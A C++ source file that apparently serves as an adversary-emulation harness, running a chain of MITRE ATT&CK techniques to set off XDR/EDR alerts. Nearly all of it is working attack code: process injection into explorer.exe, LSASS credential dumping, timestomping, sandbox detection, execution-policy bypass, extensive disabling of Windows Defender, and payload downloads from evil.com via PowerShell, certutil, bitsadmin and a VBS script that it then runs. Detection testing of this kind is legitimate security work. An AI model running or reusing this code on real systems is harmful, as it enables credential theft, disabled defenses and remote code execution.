// Enhanced REAL MITRE ATT&CK Techniques
// These WILL trigger XDR/EDR alerts - not simulations!

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <DbgHelp.h>
#include <iostream>
#include <vector>
#include <fstream>

#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "advapi32.lib")

class RealMitreAttacks {
public:
    // T1055.001 - REAL Process Injection
    static bool RealProcessInjection() {
        std::cout << "[T1055.001] Performing REAL process injection..." << std::endl;
        
        // Find a real target process (explorer.exe)
        DWORD targetPid = 0;
        PROCESSENTRY32 pe32 = {0};
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, "explorer.exe") == 0) {
                    targetPid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
        
        if (targetPid) {
            // Open target process with FULL access
            HANDLE hProcess = OpenProcess(
                PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | 
                PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                FALSE, targetPid);
                
            if (hProcess) {
                // Shellcode that will trigger detection (harmless MessageBox)
                unsigned char shellcode[] = {
                    0x48, 0x83, 0xEC, 0x28,  // sub rsp, 28h
                    0x48, 0x83, 0xE4, 0xF0,  // and rsp, -10h
                    0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00,  // lea rdx, [rel msg]
                    0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,  // lea rcx, [rel title]
                    0x45, 0x31, 0xC0,        // xor r8d, r8d
                    0x45, 0x31, 0xC9,        // xor r9d, r9d
                    0xFF, 0x15, 0x00, 0x00, 0x00, 0x00,  // call [MessageBoxA]
                    0x48, 0x83, 0xC4, 0x28,  // add rsp, 28h
                    0xC3                     // ret
                };
                
                // Allocate memory in target
                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), 
                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                
                if (pRemoteCode) {
                    // Write shellcode
                    WriteProcessMemory(hProcess, pRemoteCode, shellcode, sizeof(shellcode), NULL);
                    
                    // Create remote thread
                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                        (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
                    
                    if (hThread) {
                        std::cout << "[T1055.001] Successfully injected into PID " << targetPid << std::endl;
                        CloseHandle(hThread);
                    }
                    
                    // Don't free the memory - let it stay for detection
                }
                CloseHandle(hProcess);
            }
        }
        return true;
    }
    
    // T1003.001 - REAL LSASS Memory Dump
    static bool RealLsassDump() {
        std::cout << "[T1003.001] Performing REAL LSASS memory dump..." << std::endl;
        
        // Enable SeDebugPrivilege
        HANDLE hToken;
        TOKEN_PRIVILEGES tkp;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
            tkp.PrivilegeCount = 1;
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
            CloseHandle(hToken);
        }
        
        // Find lsass.exe
        DWORD lsassPid = 0;
        PROCESSENTRY32 pe32 = {0};
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, "lsass.exe") == 0) {
                    lsassPid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
        
        if (lsassPid) {
            HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
            if (hLsass) {
                // Create dump file
                std::string dumpPath = "C:\\Windows\\Temp\\lsass_" + std::to_string(GetTickCount()) + ".dmp";
                HANDLE hFile = CreateFileA(dumpPath.c_str(), GENERIC_WRITE, 0, NULL, 
                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                
                if (hFile != INVALID_HANDLE_VALUE) {
                    // Use MiniDumpWriteDump
                    BOOL result = MiniDumpWriteDump(hLsass, lsassPid, hFile, 
                        MiniDumpWithFullMemory, NULL, NULL, NULL);
                    
                    CloseHandle(hFile);
                    
                    if (result) {
                        std::cout << "[T1003.001] LSASS dumped to: " << dumpPath << std::endl;
                        // Try to exfiltrate or process the dump
                    }
                }
                CloseHandle(hLsass);
            }
        }
        
        // Also try comsvcs.dll method
        std::string cmd = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump " + 
            std::to_string(lsassPid) + " C:\\Windows\\Temp\\lsass.dmp full";
        system(cmd.c_str());
        
        return true;
    }
    
    // T1070.003 - REAL Timestomp
    static bool RealTimestomp() {
        std::cout << "[T1070.003] Performing REAL timestomping..." << std::endl;
        
        // Create a test file
        std::string testFile = "C:\\Windows\\Temp\\timestomp_test.txt";
        std::ofstream file(testFile);
        file << "Timestomped file";
        file.close();
        
        // Change timestamps to hide activity
        HANDLE hFile = CreateFileA(testFile.c_str(), FILE_WRITE_ATTRIBUTES, 
            FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
            FILE_ATTRIBUTE_NORMAL, NULL);
            
        if (hFile != INVALID_HANDLE_VALUE) {
            // Set to year 2010
            SYSTEMTIME st = {2010, 1, 0, 1, 12, 0, 0, 0};
            FILETIME ft;
            SystemTimeToFileTime(&st, &ft);
            
            SetFileTime(hFile, &ft, &ft, &ft);  // Creation, Access, Modified
            CloseHandle(hFile);
            
            std::cout << "[T1070.003] Timestomped file: " << testFile << std::endl;
        }
        
        return true;
    }
    
    // T1497 - REAL VM/Sandbox Detection
    static bool RealVMDetection() {
        std::cout << "[T1497] Performing REAL VM/Sandbox detection..." << std::endl;
        
        bool isVM = false;
        
        // Check for VM artifacts
        // 1. Check CPUID
        int cpuInfo[4] = {0};
        __cpuid(cpuInfo, 1);
        if ((cpuInfo[2] >> 31) & 1) {
            std::cout << "[T1497] Hypervisor bit set - VM detected via CPUID" << std::endl;
            isVM = true;
        }
        
        // 2. Check for VM files
        std::vector<std::string> vmFiles = {
            "C:\\Windows\\System32\\drivers\\vmmouse.sys",
            "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
            "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
            "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
            "C:\\Windows\\System32\\drivers\\VBoxVideo.sys"
        };
        
        for (const auto& vmFile : vmFiles) {
            if (GetFileAttributesA(vmFile.c_str()) != INVALID_FILE_ATTRIBUTES) {
                std::cout << "[T1497] VM file found: " << vmFile << std::endl;
                isVM = true;
            }
        }
        
        // 3. Check registry for VM artifacts
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
            "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            
            char value[256];
            DWORD size = sizeof(value);
            if (RegQueryValueExA(hKey, "0", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
                if (strstr(value, "VBOX") || strstr(value, "VMWARE") || strstr(value, "QEMU")) {
                    std::cout << "[T1497] VM detected in registry: " << value << std::endl;
                    isVM = true;
                }
            }
            RegCloseKey(hKey);
        }
        
        // 4. Timing checks
        ULONGLONG tick1 = GetTickCount64();
        Sleep(500);
        ULONGLONG tick2 = GetTickCount64();
        if ((tick2 - tick1) < 450) {  // Sleep accelerated
            std::cout << "[T1497] Sleep acceleration detected - Sandbox likely" << std::endl;
            isVM = true;
        }
        
        return isVM;
    }
    
    // T1140 - REAL Deobfuscation
    static bool RealDeobfuscation() {
        std::cout << "[T1140] Performing REAL deobfuscation..." << std::endl;
        
        // Create obfuscated payload
        std::string obfuscatedPayload = "powershell.exe -encodedCommand ";
        
        // Base64 encoded PowerShell command: Get-Process
        std::string base64Cmd = "RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==";
        
        // XOR encrypted payload
        std::vector<unsigned char> xorPayload = {
            0x50 ^ 0xAA, 0x6F ^ 0xAA, 0x77 ^ 0xAA, 0x65 ^ 0xAA, 
            0x72 ^ 0xAA, 0x53 ^ 0xAA, 0x68 ^ 0xAA, 0x65 ^ 0xAA,
            0x6C ^ 0xAA, 0x6C ^ 0xAA
        };
        
        // Deobfuscate XOR
        std::cout << "[T1140] Deobfuscating XOR payload..." << std::endl;
        for (auto& byte : xorPayload) {
            byte ^= 0xAA;
        }
        
        // Execute deobfuscated commands
        std::string fullCmd = obfuscatedPayload + base64Cmd;
        system(fullCmd.c_str());
        
        // Create and execute a deobfuscated script
        std::ofstream script("C:\\Windows\\Temp\\deobfuscated.ps1");
        script << "# Deobfuscated script\n";
        script << "$processes = Get-Process\n";
        script << "$processes | Out-File C:\\Windows\\Temp\\processes.txt\n";
        script.close();
        
        system("powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\deobfuscated.ps1");
        
        return true;
    }
    
    // T1562.001 - REAL Disable Windows Defender
    static bool RealDisableDefender() {
        std::cout << "[T1562.001] Attempting to REALLY disable Windows Defender..." << std::endl;
        
        // Multiple methods to disable Defender
        
        // 1. Registry modifications
        system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f");
        system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f");
        system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f");
        system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f");
        
        // 2. PowerShell commands
        system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
        system("powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"");
        system("powershell -Command \"Set-MpPreference -DisableScriptScanning $true\"");
        
        // 3. Service manipulation
        system("sc stop WinDefend");
        system("sc config WinDefend start=disabled");
        
        // 4. Add exclusions for entire C: drive
        system("powershell -Command \"Add-MpPreference -ExclusionPath 'C:\\'\"");
        system("powershell -Command \"Add-MpPreference -ExclusionProcess '*'\"");
        
        // 5. Disable Windows Defender scheduled tasks
        system("schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Disable");
        system("schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /Disable");
        system("schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable");
        system("schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Disable");
        
        return true;
    }
    
    // T1105 - REAL Ingress Tool Transfer
    static bool RealToolTransfer() {
        std::cout << "[T1105] Performing REAL tool download and execution..." << std::endl;
        
        // Download tools using multiple methods
        
        // 1. PowerShell download
        system("powershell -Command \"Invoke-WebRequest -Uri 'http://evil.com/mimikatz.exe' -OutFile 'C:\\Windows\\Temp\\mimi.exe'\"");
        
        // 2. Certutil download (commonly used by attackers)
        system("certutil -urlcache -split -f http://evil.com/tool.exe C:\\Windows\\Temp\\tool.exe");
        
        // 3. Bitsadmin download
        system("bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/payload.exe C:\\Windows\\Temp\\payload.exe");
        
        // 4. Create a downloader script
        std::ofstream downloader("C:\\Windows\\Temp\\downloader.vbs");
        downloader << "Dim objXMLHTTP, objADOStream\n";
        downloader << "Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")\n";
        downloader << "objXMLHTTP.open \"GET\", \"http://evil.com/malware.exe\", false\n";
        downloader << "objXMLHTTP.send()\n";
        downloader << "Set objADOStream = CreateObject(\"ADODB.Stream\")\n";
        downloader << "objADOStream.Open\n";
        downloader << "objADOStream.Type = 1\n";
        downloader << "objADOStream.Write objXMLHTTP.ResponseBody\n";
        downloader << "objADOStream.SaveToFile \"C:\\Windows\\Temp\\malware.exe\", 2\n";
        downloader.close();
        
        system("cscript C:\\Windows\\Temp\\downloader.vbs");
        
        return true;
    }
};

// Master function to execute all real attacks
void ExecuteRealAttackChain() {
    std::cout << "\n=== EXECUTING REAL MITRE ATT&CK TECHNIQUES ===" << std::endl;
    std::cout << "WARNING: This WILL trigger XDR/EDR alerts!" << std::endl;
    std::cout << "=========================================\n" << std::endl;
    
    // Initial Access & Execution
    RealMitreAttacks::RealDeobfuscation();
    Sleep(2000);
    
    // Defense Evasion
    RealMitreAttacks::RealVMDetection();
    Sleep(1000);
    
    RealMitreAttacks::RealDisableDefender();
    Sleep(3000);
    
    // Credential Access
    RealMitreAttacks::RealLsassDump();
    Sleep(2000);
    
    // Persistence & Privilege Escalation
    RealMitreAttacks::RealProcessInjection();
    Sleep(2000);
    
    // Collection & Exfiltration
    RealMitreAttacks::RealTimestomp();
    Sleep(1000);
    
    // Command & Control
    RealMitreAttacks::RealToolTransfer();
    
    std::cout << "\n=== ATTACK CHAIN COMPLETE ===" << std::endl;
    std::cout << "Check your XDR console - it should be on fire! 🔥" << std::endl;
}
